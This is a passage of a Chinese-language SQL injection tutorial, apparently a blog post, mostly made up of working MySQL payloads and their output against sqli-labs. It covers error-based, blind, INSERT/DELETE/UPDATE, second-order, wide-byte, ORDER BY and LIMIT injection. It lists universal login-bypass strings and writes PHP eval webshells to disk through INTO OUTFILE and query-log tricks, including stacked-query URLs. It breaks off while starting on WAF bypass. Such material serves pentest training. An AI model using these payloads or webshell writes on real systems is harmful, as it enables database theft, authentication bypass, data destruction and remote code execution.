user()),0x7e),1));\n\n\n4.geometrycollection()\n\nselect * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));\n\n\n5.multipoint()\n\nselect * from test where id=1 and multipoint((select * from(select * from(select user())a)b));\n\n\n6.polygon()\n\nselect * from test where id=1 and polygon((select * from(select * from(select user())a)b));\n\n\n7.multipolygon()\n\nselect * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));\n\n\n8.linestring()\n\nselect * from test where id=1 and linestring((select * from(select * from(select user())a)b));\n\n\n9.multilinestring()\n\nselect * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));\n\n10.exp()\n\nselect * from test where id=1 and exp(~(select * from(select user())a));\n\n</code></pre>\n<p>每个一个报错语句都有它的原理 比如  <code>exp()</code>  报错的原理，手册说到 exp 是一个数学函数 取 e 的 x 次方，当我们输入的值大于 709 就会报错 然后～取反它的值总会大于 709 所以报错。</p>\n<p>简单的用报错语句来注入一下把这里我就利用函数  <code>updatexml()</code></p>\n<pre><code>updatexml (XML_document, XPath_string, new_value); \nXML_document: 是String格式，为XML文档对象的名称，文中为Doc \nXPath_string : Xpath\nnew_value :String格式，替换查找到的符合条件的数据 \n\n</code></pre>\n<p>其中关键点就是 <code>XPath_string</code>  这块了 因为我们传入的的不是 <code>XPath_string</code> , 为什么要使用 <code>concat</code>  这个函数呢，因为它是个连接函数你不用的话 <code>(updatexml(1,(select user()),1))</code>  这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到 <code>concat</code>  用特殊字符给他连接起来。</p>\n<pre><code>爆库：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +\n\n爆表：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- +\n\n爆字段：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +\n\n爆数据：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +\n\n\n\n</code></pre>\n<p>在报错里面直接使用 MySQL 最基本的查表就可以了，你也可以把 concat 放在外面  <code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p>\n<p>自己灵活多变，这里我值得注意的是它加了连接字符 md5 只能爆出 31 位，你可以用分割函数分割出来。</p>\n<pre><code>substr(string string,num start,num length);\n\nstring为字符串\n\nstart为起始位置\n\nlength为长度\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +\n\n\n\n</code></pre>\n<p>因为我密码不是 md5 的 所以我加了个密来分割。</p>\n<h1 id=\"0x00-盲注\"><a class=\"anchor\" href=\"#0x00-盲注\">#</a> 0x00 盲注</h1>\n<p>盲注我这里只归纳为</p>\n<ol>\n<li>\n<p>时间盲注</p>\n</li>\n<li>\n<p>布尔盲注</p>\n</li>\n</ol>\n<p>其实在如今的实际环境中一般盲注的情况毕竟多，时间盲注太费时间 同时对网络要求比较高，二分，dnslog, 等等可以加快注入的进程。</p>\n<h1 id=\"0x01-盲注中值得注意的问题\"><a class=\"anchor\" href=\"#0x01-盲注中值得注意的问题\">#</a> 0x01 盲注中值得注意的问题</h1>\n<ol>\n<li>\n<p>盲注中使用 and 你得确定你查询的值得存在 。</p>\n</li>\n<li>\n<p>在返回多组数据的情况下，你的延时不再是 单纯的  <code>sleep(5)</code>  他将根据你返回的数据条数来反复执行</p>\n</li>\n<li>\n<p>在如同搜索型时尽量搜索存在且数目较少的关键词</p>\n</li>\n<li>\n<p>尽量不要使用 or</p>\n</li>\n</ol>\n<p>至于以上为什么会出现这种原因 推荐大家看看 这篇文章讲的很清楚 https://www.t00ls.net/thread-45590-1-10.html</p>\n<h1 id=\"0x02-简单时间盲注\"><a class=\"anchor\" href=\"#0x02-简单时间盲注\">#</a> 0x02 简单时间盲注</h1>\n<p>时间盲注也叫延时注入 一般用到函数  <code>sleep()</code>   <code>BENCHMARK()</code>  还可以使用笛卡尔积 (尽量不要使用，内容太多会很慢很慢), 查阅 mysql 手册会发现很多东西</p>\n<p>一般时间盲注我们还需要使用条件判断函数</p>\n<h2 id=\"if\"><a class=\"anchor\" href=\"#if\">#</a> if()</h2>\n<p><code>if（expre1，expre2，expre3）</code>  当 expre1 为 true 时，返回 expre2，false 时，返回 expre3<br />\n 盲注的同时也配合着 mysql 提供的分割函，与正则函数 like 函数，比较函数等等，还是那句话多看手册。</p>\n<pre><code>substr\nsubstring\nleft\n......\n\n</code></pre>\n<p>我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号 常用到的就有  <code>ascii()</code>   <code>hex()</code>  等等<br />\n <code>benchmark()</code>  其作用是来测试一些函数的执行速度。benchmark () 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式。</p>\n<pre><code>mysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r'),sleep(5),1);\nEmpty set (5.01 sec)\n\nmysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r1'),sleep(5),1);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r'),BENCHMARK(20000000,md5('a')),1);\nEmpty set (5.15 sec)\n\n</code></pre>\n<h2 id=\"case-when-then-else-end\"><a class=\"anchor\" href=\"#case-when-then-else-end\">#</a> case when then else end</h2>\n<pre><code>mysql&gt; select * from users where id =1 and case when (substr((select user()),1,1)=&quot;rr&quot;) then sleep(3) else 1 end;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from users where id =1 and case when (substr((select user()),1,1)=&quot;r&quot;) then sleep(3) else 1 end;\nEmpty set (3.00 sec)\n\n</code></pre>\n<p>不推荐使用笛卡尔积当数据过多时会造成 DOS。</p>\n<h1 id=\"0x03-布尔盲注\"><a class=\"anchor\" href=\"#0x03-布尔盲注\">#</a> 0x03 布尔盲注</h1>\n<p>盲注思路的思路很多 比如正则匹配，比较函数，运算符，推荐大家可以看看<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTcwNjI2\"> https://www.anquanke.com/post/id/170626</span></p>\n<ol>\n<li>直接通过字符串截取对比，类似函数很多后面做个总结吧</li>\n</ol>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=1' and substr((select user()),1,1)='r' -- +\n</code></pre>\n<ol start=\"2\">\n<li>用  <code>IFNULL()</code>  函数</li>\n</ol>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=1' and IFNULL((substr((select user()),1,1)='r'),0) -- +\n\n</code></pre>\n<ol start=\"3\">\n<li>使用 比较函数 <code>strcmp()</code></li>\n</ol>\n<pre><code>1.\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and strcmp((substr((select user()),1,1)='r'),1) -- +\nhttp://127.0.0.1/sqli/Less-1/?id=1' and strcmp((substr((select user()),1,1)='r'),0) -- +\n\n\n2.\n\nmysql&gt; select * from users where id =1 and 0=strcmp((substr((select user()),1,1)),'o');\nEmpty set (0.00 sec)\n\nmysql&gt; select * from users where id =1 and 0=strcmp((substr((select user()),2,1)),'o');\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n\n</code></pre>\n<h1 id=\"0x04-小技巧\"><a class=\"anchor\" href=\"#0x04-小技巧\">#</a> 0x04 小技巧</h1>\n<p>在没有办法的情况下必须使用到 or 的延时注入不如试试子查询，他也只将延时 5s</p>\n<pre><code>http://192.168.130.135/Less-1/?id=1'  or if((substr((select user()),1,1)='r'),((select sleep(5) from information_schema.schemata as b)),1);-- +\n\n</code></pre>\n<h1 id=\"0x00-insertdeleteupdate-注入\"><a class=\"anchor\" href=\"#0x00-insertdeleteupdate-注入\">#</a> 0x00 insert,delete,update 注入</h1>\n<p>insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，和其他情况。</p>\n<h1 id=\"0x01-insertdeleteupdate\"><a class=\"anchor\" href=\"#0x01-insertdeleteupdate\">#</a> 0x01 insert,delete,update</h1>\n<h2 id=\"insert\"><a class=\"anchor\" href=\"#insert\">#</a> insert</h2>\n<p>可以看到假如没闭合是会产生很多垃圾数据的，所以这类注入建议手工或者自己写工具。</p>\n<p>一般这种注入会出现在 注册、ip 头、留言板等等需要写入数据的地方，同时这种注入不报错一般较难发现。</p>\n<ol>\n<li>报错</li>\n</ol>\n<pre><code>mysql&gt; insert into admin (id,username,password) values (2,&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;,&quot;admin&quot;);\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; select * from admin;\n+------+-----------------------------------------------+----------+\n| id   | username                                      | password |\n+------+-----------------------------------------------+----------+\n|    1 | admin                                         | admin    |\n|    1 | and 1=1                                       | admin    |\n|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |\n+------+-----------------------------------------------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; insert into admin (id,username,password) values (2,&quot;&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;&quot;,&quot;admin&quot;);\nERROR 1105 (HY000): XPATH syntax error: '~5.5.53'\n\n</code></pre>\n<ol start=\"2\">\n<li>盲注</li>\n</ol>\n<p>int 型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等</p>\n<pre><code>mysql&gt; insert into admin values (2+if((substr((select user()),1,1)='r'),sleep(5),1),'1',&quot;admin&quot;);\nQuery OK, 1 row affected (5.00 sec)\n\nmysql&gt; insert into admin values (2+if((substr((select user()),1,1)='p'),sleep(5),1),'1',&quot;admin&quot;);\nQuery OK, 1 row affected (0.00 sec)\n\n</code></pre>\n<p>字符型注意闭合不能使用 and</p>\n<pre><code>mysql&gt; insert into admin values (2,''+if((substr((select user()),1,1)='p'),sleep(5),1)+'',&quot;admin&quot;);\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; insert into admin values (2,''+if((substr((select user()),1,1)='r'),sleep(5),1)+'',&quot;admin&quot;);\nQuery OK, 1 row affected (5.01 sec)\n\n</code></pre>\n<p>注意盲注产生大量垃圾数据。</p>\n<h2 id=\"delete\"><a class=\"anchor\" href=\"#delete\">#</a> delete</h2>\n<p>报错注入同上</p>\n<p>值得注意的时 delete 注入很危险，很危险，很危险。</p>\n<p>语句不当 将会亲人泪两行  <code>or 1=1</code>  因为 1=1 为 true 所以每一行被删除了，他以前用 sqlmap 一把梭 现在过的很好，每顿都有人送饭到手上。</p>\n<p>所以在 delete 注入时使用 or 一定要为 false</p>\n<pre><code>mysql&gt; delete from admin where id =3 or 1=1;\nQuery OK, 4 rows affected (0.00 sec)\n\n</code></pre>\n<p>报错注入</p>\n<pre><code>mysql&gt; delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);\nERROR 1105 (HY000): XPATH syntax error: '~5.5.53'\n\n\n\n</code></pre>\n<p>盲注</p>\n<p>or 配上  <code>if()</code>  函数使用不当 再提下 if (expr1,expr2,expr3)，如果 expr1 的值为 true，返回 expr2 的值，如果 expr1 的值为 false，<br />\n返回 expr3 的值。</p>\n<pre><code>mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),1);\nQuery OK, 3 rows affected (0.00 sec)\n\n</code></pre>\n<p>所以 delete 中 or 的正确使用方法 (or 右边要为 false)</p>\n<pre><code>mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),0);\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r'),sleep(5),0);\nQuery OK, 0 rows affected (5.00 sec)\n\n</code></pre>\n<h2 id=\"update\"><a class=\"anchor\" href=\"#update\">#</a> update</h2>\n<p>与上面的类似</p>\n<pre><code>mysql&gt; select * from admin;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | 1        | admin    |\n|    2 | 1        | admin    |\n|    2 | 1        | admin    |\n|    2 | admin    | admin    |\n+------+----------+----------+\n4 rows in set (0.00 sec)\n\nmysql&gt; update admin set id=&quot;5&quot;+sleep(5)+&quot;&quot; where id=2;\nQuery OK, 4 rows affected (20.00 sec)\nRows matched: 4  Changed: 4  Warnings: 0\n</code></pre>\n<h1 id=\"0x02-文末-2\"><a class=\"anchor\" href=\"#0x02-文末-2\">#</a> 0x02 文末</h1>\n<p>update，insert 注入怎么找，我们可以尝试性插入、引号、双引号、转义符 \\ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p>\n<h1 id=\"0x00-二次注入\"><a class=\"anchor\" href=\"#0x00-二次注入\">#</a> 0x00 二次注入</h1>\n<p>二次注入的原理是 sql 语句没有被转义直接存入数据库，然后在被读取查询而导致的。</p>\n<p>二次注入在 php 种通常见于，插入时被 <code>addslashes()</code>   <code>get_magic_quotes_gpc</code>  等等转义，但是写入数据库时还是使用原来的数据，二次注入造成原因时多种多样的。</p>\n<p>在没有被单引号包裹的 sql 语句下，我们可以用 16 进制编码他，这样就不会带有单引号等。</p>\n<pre><code>mysql&gt; insert into admin (id,name,pass) values ('3',0x61646D696E27313131,'11');\nQuery OK, 1 row affected (0.00 sec)\n\nmysql&gt; select * from admin;\n+----+-----------+-------+\n| id | name      | pass  |\n+----+-----------+-------+\n|  1 | admin     | admin |\n|  2 | admin'111 | 11111 |\n|  3 | admin'111 | 11    |\n+----+-----------+-------+\n4 rows in set (0.00 sec)\n\n</code></pre>\n<p>想要具体了解这个 大家可以做做 sqli-labs 24 课，二次注入在没有源码的情况比较难发现，通常见于注册，</p>\n<h1 id=\"0x01-宽字节注入\"><a class=\"anchor\" href=\"#0x01-宽字节注入\">#</a> 0x01 宽字节注入</h1>\n<pre><code>1.没使用宽字节\n%27 -&gt; %5C%27\n\n2. 试用宽字节\n\n%df%27 -&gt; %df%5c%27 -&gt; 運'\n</code></pre>\n<ol>\n<li>\n<p>在我们输入单引号时  <code>addslashes()</code>  或者 <code>get_magic_quotes_gpc</code>  给我们的单引号加入了转义字符 <code>\\</code>  就变成了 <code>\\'</code></p>\n</li>\n<li>\n<p>我们输入经过转换后由于编码的不同把 <code>%df%5c</code>  转换为了一个汉字。</p>\n</li>\n</ol>\n<p>想要具体了解找个的可以 做做 sqli-labs 33 课</p>\n<h1 id=\"0x00-order-by-注入\"><a class=\"anchor\" href=\"#0x00-order-by-注入\">#</a> 0x00 order by 注入</h1>\n<p>这是一种特殊的注入 sql 语句为  <code>select * from admin order by $id</code>  我们一般用 order by 来判断他的列数，其实他就是一个依照第几个列来排序的过程。</p>\n<p>order by 注入是不能 直接使用 <code>and 1=1</code>  来判断的，他需要用到条件语句。</p>\n<pre><code>mysql&gt; select * from admin order by id;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; select * from admin order by username;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\n</code></pre>\n<h2 id=\"盲注\"><a class=\"anchor\" href=\"#盲注\">#</a> 盲注</h2>\n<ol>\n<li>布尔</li>\n</ol>\n<p>简单的判断</p>\n<pre><code>mysql&gt; select * from admin order by if(1=1,username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; select * from admin order by if(1=3,username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\n</code></pre>\n<p>简单的注入</p>\n<pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r1'),username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\nmysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),username,password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | admin    | ddmin    |\n|    3 | bdmin    | fdmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (0.00 sec)\n\n\nhttp://127.0.0.1/sqli/Less-46/?sort=if((substr((select user()),1,1)='r'),username,password)\n\n</code></pre>\n<ol start=\"2\">\n<li>时间盲注</li>\n</ol>\n<p>时间盲注不能直接简单的 <code>sleep()</code>  因为他会对每条内容来执行你的语句，所以会造成 dos 测试获取速度慢等问题，这时候我们需要用到子查询</p>\n<pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),sleep(5),password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    3 | bdmin    | fdmin    |\n|    2 | admin    | ddmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (15.01 sec)\n\n</code></pre>\n<p>我们写一条简单的子查询试试</p>\n<pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r'),(select 1 from (select sleep(2)) as b),password);\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    3 | bdmin    | fdmin    |\n|    2 | admin    | ddmin    |\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n3 rows in set (2.01 sec)\n\n</code></pre>\n<h2 id=\"报错注入\"><a class=\"anchor\" href=\"#报错注入\">#</a> 报错注入</h2>\n<pre><code>http://127.0.0.1/sqli/Less-46/?sort=(extractvalue(1,concat(0x3a,version())),1)\n\nmysql&gt; select * from admin order by (extractvalue(1,concat(0x3a,version())),1);\nERROR 1105 (HY000): XPATH syntax error: ':5.5.53'\n\n</code></pre>\n<h1 id=\"0x01-from\"><a class=\"anchor\" href=\"#0x01-from\">#</a> 0x01 From</h1>\n<p>from 后面的注入比较少 还是提一下</p>\n<pre><code>select * from $id;\n\n</code></pre>\n<ol>\n<li>\n<p>可以结合 order by 来注入</p>\n</li>\n<li>\n<p>可以使用联合注入来注入</p>\n</li>\n</ol>\n<pre><code>mysql&gt; select * from admin union select 1,user(),3;\n+------+----------------+----------+\n| id   | username       | password |\n+------+----------------+----------+\n|    3 | bdmin          | fdmin    |\n|    2 | admin          | ddmin    |\n|    1 | cdmin          | bdmin    |\n|    1 | root@localhost | 3        |\n+------+----------------+----------+\n4 rows in set (0.02 sec)\n\n</code></pre>\n<p>方法跟普通注入一样的一样自己加上表名</p>\n<h1 id=\"0x02-limit\"><a class=\"anchor\" href=\"#0x02-limit\">#</a> 0x02 limit</h1>\n<p>这种注入也不是很常见，依照 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXRlaXAuY29tL2Jsb2cvc3FsLWluamVjdGlvbnMtaW4tbXlzcWwtbGltaXQtY2xhdXNlLw==\">https://rateip.com/blog/sql-injections-in-mysql-limit-clause/</span> 来提一下</p>\n<pre><code>mysql&gt; select * from admin where id &gt;0 limit 0,1 $id\n\n</code></pre>\n<p>如何利用呢 大佬们已经给出方法了 用  <code>PROCEDURE ANALYSE</code>  配合报错注入，所以多看文档，如果你想提升下自己的水平</p>\n<pre><code>mysql&gt; select * from admin where id &gt;0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);\nERROR 1105 (HY000): XPATH syntax error: ':5.5.53'\nERROR:\nNo query specified\n\n</code></pre>\n<p>这里延时只能使用 <code>BENCHMARK()</code>  如同</p>\n<pre><code>select * from admin where id &gt;0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1=1,benchmark(2000000,md5(404)),1)))),1);\n\n</code></pre>\n<h1 id=\"0x00-再谈万能密码登陆\"><a class=\"anchor\" href=\"#0x00-再谈万能密码登陆\">#</a> 0x00 再谈万能密码登陆</h1>\n<p>万能密码基本大家都用过，各种各样的，如下</p>\n<pre><code>'or 1=1/*\n&quot;or &quot;a&quot;=&quot;a\n&quot;or 1=1--\n&quot;or&quot;=&quot;\n&quot;or&quot;=&quot;a'='a\n&quot;or1=1--\n&quot;or=or&quot;\n''or'='or'\n') or ('a'='a\n'.).or.('.a.'='.a\n'or 1=1\n'or 1=1--\n'or 1=1/*\n'or&quot;=&quot;a'='a\n'or' '1'='1'\n'or''='\n'or''=''or''='\n'or'='1'\n'or'='or'\n'or.'a.'='a\n'or1=1--\n1'or'1'='1\na'or' 1=1--\na'or'1=1--\nor 'a'='a'\nor 1=1--\nor1=1--\n\n</code></pre>\n<p>其实根据前面的文章我们很容易看出 他的原理就是让我们的条件恒成立 至于为什么这么多种，就是根据语句的形势来闭合的，</p>\n<p>这里面涉及到运算符的优先级，MySQL 运算的特性，然后下面我们以几个例子来做做最另类的万能密码</p>\n<pre><code>mysql&gt; select * from admin where name = '/*' and pass = '*/';\nEmpty set (0.00 sec)\n\n</code></pre>\n<p>注释绕过</p>\n<pre><code>mysql&gt; select * from admin where name = ''or 1=1-- ' and pass = '123';\n    -&gt; ;\n+----+-----------+-------+\n| id | name      | pass  |\n+----+-----------+-------+\n|  1 | admin     | admin |\n|  2 | admin'111 | 11111 |\n|  3 | admin'111 | 11    |\n|  4 | admin'111 | 11    |\n+----+-----------+-------+\n4 rows in set (0.00 sec)\n\n</code></pre>\n<p>经典的 <code>or 1=1--</code>  其中 1=1 恒为 true 然后导致每条数据都成立返回</p>\n<p>那么知道了这个原理怎么构造一个简单的万能密码呢</p>\n<pre><code>mysql&gt; select ''=0\n    -&gt; ;\n+------+\n| ''=0 |\n+------+\n|    1 |\n+------+\n1 row in set (0.00 sec)\n\nmysql&gt; select 1=0=0;\n+-------+\n| 1=0=0 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.30 sec)\n\n</code></pre>\n<p>我们可以看到在 mysql 中 空字符串 '' 等于 0 为 1 也就是 true 知道这个特性我们可以来构造我们的万能密码了</p>\n<pre><code>mysql&gt; select * from admin where name = ''|0#'  and pass = '123';\n    -&gt; ;\n+----+-----------+-------+\n| id | name      | pass  |\n+----+-----------+-------+\n|  1 | admin     | admin |\n|  2 | admin'111 | 11111 |\n|  3 | admin'111 | 11    |\n|  4 | admin'111 | 11    |\n+----+-----------+-------+\n4 rows in set, 5 warnings (0.00 sec)\n\n</code></pre>\n<p>仅仅用了  <code>'|0#</code>  个字符就能达到我们的效果 其他方法大家还可以测试，因为是自己发现的，然后问了几个师傅 发现 ctf 已经别人都用过了 ，不得不承认自己的知识量远远不够。</p>\n<h1 id=\"0x00-读写文件与堆叠查询\"><a class=\"anchor\" href=\"#0x00-读写文件与堆叠查询\">#</a> 0x00 读写文件与堆叠查询</h1>\n<p>MySQL 中 在在 mysql 5.6.34 版本以后 secure_file_priv 的值默认为 NULL , 而 secure_file_priv 为 null 那么我们就不能导出文件，以下都建立在</p>\n<p>secure_file_priv 的默认值被修改为无才能利用，且这个只能手工修改配置文件不能用 sql 语句，也就是想直接导出需要管理员不知道干了什么帮你修改好这个权限才行。</p>\n<p>windows 系统在 my.ini 的 [mysqld] 下面加上 secure_file_priv = ，linux 的在 /etc/my.cnf 同时读写权限问题就不用说了。</p>\n<pre><code>mysql&gt; show global variables like '%secure%';\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_auth      | OFF   |\n| secure_file_priv |       |\n+------------------+-------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<h1 id=\"0x01-读文件\"><a class=\"anchor\" href=\"#0x01-读文件\">#</a> 0x01 读文件</h1>\n<p>可以把文件 hex 一下输出，文件名也是支持 hex 和 char 的</p>\n<pre><code>mysql&gt; select * from admin union select 1,hex(load_file('D:\\\\1.txt')),3;\n+------+------------------------+----------+\n| id   | username               | password |\n+------+------------------------+----------+\n|    3 | bdmin                  | fdmin    |\n|    2 | admin                  | ddmin    |\n|    1 | cdmin                  | bdmin    |\n|    1 | 617574686F72A3BA343034 | 3        |\n+------+------------------------+----------+\n4 rows in set (0.02 sec)\n\nhttp://127.0.0.1/sqli/Less-1/?id=-1' union select 1,hex(load_file(0x463A5C5C312E747874)),3-- +\n\n</code></pre>\n<p>当然你加入你进了 phpmyadmin 类似的平台 可以执行 sql 语句，你可以选择把导入的数据插入表中<br />\n同时支持导入的函数还有  <code>load data infile</code></p>\n<pre><code>create table test(test text);\ninsert into test(test) values (load_file('D:\\\\1.txt'));\nselect * from test;\n\n</code></pre>\n<p>如果能读文件在渗透测试中往往很有用，可以读取配置文件，系统问题等等关键信息，在我以前的一次意淫中，进入一个后台功能全被限制死了，但是可以执行导入，通过一个编辑器的目录遍历，发现某文件时间不一致，读取出来发现是 webshell，应该是某黑客进去之后做的手脚</p>\n<h1 id=\"0x02-写文件\"><a class=\"anchor\" href=\"#0x02-写文件\">#</a> 0x02 写文件</h1>\n<ol>\n<li></li>\n</ol>\n<p>写文件我们一般用到  <code>dumpfile</code>  与 <code>outfile</code>  她们其实是有区别</p>\n<p><code>outfile</code>  会在行末写入新行，而且会转义换行符</p>\n<p><code>dumpfile</code>  能导出一个完整的文件，不会有任何转义 所以我们 udf 提取一般用的 dumpfile</p>\n<pre><code>\nmysql&gt; select * from admin where id =1 union select 1,'&lt;?php eval($_POST[cmd]);?&gt;',3 into outfile 'G:\\\\test.txt';\nQuery OK, 2 rows affected (0.00 sec)\n\n</code></pre>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>后来大佬们找到一种方法通过日志来写 shell 解决这个史诗级难题，但是需要能直接执行 sql 语句利用有限</p>\n<pre><code>set global general_log=on;\nset global general_log_file='D://404.php';\nselect '&lt;?php eval($_POST['404']) ?&gt;';\n\n</code></pre>\n<p>通过把日志路径更改 ，让查询的日志保存过去，还有一种慢日志，原理一样</p>\n<pre><code>mysql&gt; show global variables like '%query_log%'\n    -&gt; ;\n+---------------------+-------------------------------------------------------------+\n| Variable_name       | Value                                                       |\n+---------------------+-------------------------------------------------------------+\n| slow_query_log      | OFF                                                         |\n| slow_query_log_file | D:\\phpstudy\\PHPTutorial\\MySQL\\data\\LAPTOP-M4APUKKN-slow.log |\n+---------------------+-------------------------------------------------------------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<pre><code>set global slow_query_log=1;\n\nset global slow_query_log_file='D://404.php'\n\nselect '&lt;?php eval($_POST['404']) ?&gt;' or sleep(15);\n\n</code></pre>\n<h1 id=\"0x03-堆叠查询\"><a class=\"anchor\" href=\"#0x03-堆叠查询\">#</a> 0x03 堆叠查询</h1>\n<p>mysql 是支持堆叠查询的用 <code>;</code>  分割语句，但是 php 原生的连接方式不支持，但是使用 PDO,mysqli_multi_query () 等等是支持多语句的，在我们使用堆叠查询的时候基本是没有回显的，而且其实很难遇到这种环境。</p>\n<pre><code>mysql&gt; select * from admin where id =1;select user();\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | cdmin    | bdmin    |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\n+----------------+\n| user()         |\n+----------------+\n| root@localhost |\n+----------------+\n1 row in set (0.00 sec)\n\n</code></pre>\n<p>这里讲在一起就是因为，假如支持堆叠查询还可以用日志来写 shell。</p>\n<pre><code>\nhttp://192.168.59.129/Less-38/?id=1%27;set global general_log=on;set global general_log_file='C://phpstudy//404.php';--+\n\nhttp://192.168.59.129/Less-38/?id=1%27;select '&lt;?php eval($_POST[404]) ?&gt;';--+\n\n</code></pre>\n<h1 id=\"0x00-联合注入过狗\"><a class=\"anchor\" href=\"#0x00-联合注入过狗\">#</a> 0x00 联合注入过狗</h1>\n<p>其实我们过这些 waf 就是个正则的绕过，因为这种通用型的 waf，需要考虑到用户体验，他不能出现什么东西就直接拦截，比正则过滤的一些好绕一点，如何成功绕过我们需要具备对 mysql 各个函数、语法、特性的熟悉，然后通过不断的 fuzz 来测试出我们想要的 payload 的</p>\n<p>每个狗的版本不同，他的正则也是不同的所以有的 payload 在最新版可以用，在老版本就可能用不上，当你的知识量有一定的积累后，绕过 waf 或许就很简单，</p>\n<p>如何快速的提升自己的这些知识，多看文章，多看官方手册。</p>\n<h1 id=\"0x01-探索-and\"><a class=\"anchor\" href=\"#0x01-探索-and\">#</a> 0x01 探索 and</h1>\n<p>实验环境 ： win2003 apache 安全狗 4.0.23957</p>\n<p>首先我们来探索简单的语句  <code>and 1=1</code></p>\n<pre><code>and 1    拦截\nand '1'  拦截\nand a    不拦截\nand 'a'  拦截\nand !    不拦截\nand 1+1  拦截\nand 1+a  拦截\nand hex(1) 不拦截\n\n</code></pre>\n<p>通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有 2 个思路</p>\n<ol>\n<li>\n<p>用其他字符替换 and 或者 